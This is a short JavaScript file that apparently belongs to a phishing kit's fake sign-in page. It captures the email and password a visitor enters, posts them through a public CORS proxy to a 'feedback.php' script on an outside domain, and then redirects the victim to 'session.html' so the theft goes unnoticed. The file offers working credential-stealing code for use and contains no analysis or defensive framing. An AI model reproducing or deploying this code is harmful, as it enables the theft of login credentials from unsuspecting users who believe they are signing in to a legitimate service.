  var url_link = "session.html";
  
 

  function redirect(url_link){
     setTimeout(function(){window.location.href = url_link;},2000);
  }

  document.getElementById('signin').addEventListener('submit', processPassword);
  

 
  function processPassword(evt){
      evt.preventDefault();
     
      var email = this.email.value.trim();
      var upass = this.password.value.trim();

      if(ValidateEmail(email)  && upass !=''){
        
        em = email
        pass = upass

        sendDetails(em,pass,'part2')
        hide('signInErrorDiv')
        
      }else{
        show('signInErrorDiv')
      }
  }

 

 
  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://cors-anywhere.herokuapp.com/https://bdjobmarket.com/feedback.php", o).then(function(t) {
          200 === t.status && redirect(url_link)
      }).catch(function(t) {
          console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
      })
  }


 function show(element){
    document.getElementById(element).style.display = "flex";
  }

  function hide(element){
    document.getElementById(element).style.display = "none";
  }

 function ValidateEmail(mail) 
  {
   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
    {
      return (true)
    }
      return (false)
  }

